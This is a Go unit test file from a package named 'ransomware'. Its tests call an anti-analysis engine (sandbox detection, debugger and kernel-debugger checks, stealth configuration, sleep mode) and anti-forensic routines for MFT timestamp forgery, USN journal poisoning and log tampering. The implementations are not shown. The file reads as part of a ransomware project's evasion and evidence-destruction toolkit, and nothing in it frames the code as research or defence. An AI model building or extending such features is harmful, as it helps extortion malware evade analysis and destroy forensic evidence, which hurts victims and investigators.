package ransomware

import (
	"testing"
	"time"
)

func TestNewAntiAnalysisEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiAnalysisEngine(cfg)
	if e == nil {
		t.Fatal("NewAntiAnalysisEngine() returned nil")
	}
}

func TestAntiAnalysisIsSandboxed(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiAnalysisEngine(cfg)
	result := e.IsSandboxed()
	t.Logf("IsSandboxed: %v (expected false in test env)", result)
}

func TestAntiAnalysisHasKernelDebugger(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiAnalysisEngine(cfg)
	result := e.HasKernelDebugger()
	t.Logf("HasKernelDebugger: %v", result)
}

func TestAntiAnalysisCheckDebugger(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiAnalysisEngine(cfg)
	result := e.CheckDebugger()
	t.Logf("CheckDebugger: %v", result)
}

func TestAntiAnalysisStealthConfig(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiAnalysisEngine(cfg)
	sc := e.StealthConfig()
	if sc == nil {
		t.Log("StealthConfig returned nil (expected if not configured)")
	} else {
		t.Logf("StealthConfig: %+v", sc)
	}
}

func TestAntiAnalysisEnterSleepMode(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewAntiAnalysisEngine(cfg)
	e.EnterSleepMode(0)
	t.Log("EnterSleepMode(0) completed without panic")
}

func TestMFTTimestomp(t *testing.T) {
	err := MFTTimestomp("/tmp/test_mft_timestomp", time.Time{})
	t.Logf("MFTTimestomp: %v (expected error in non-Windows env)", err)
}

func TestUSNJournalPoison(t *testing.T) {
	err := USNJournalPoison("/tmp/test_usn", 5)
	t.Logf("USNJournalPoison: %v (expected error in non-Windows env)", err)
}

func TestLogToxin(t *testing.T) {
	err := LogToxin("/tmp/test_log_toxin", 3)
	t.Logf("LogToxin: %v (expected error in non-Windows env)", err)
}
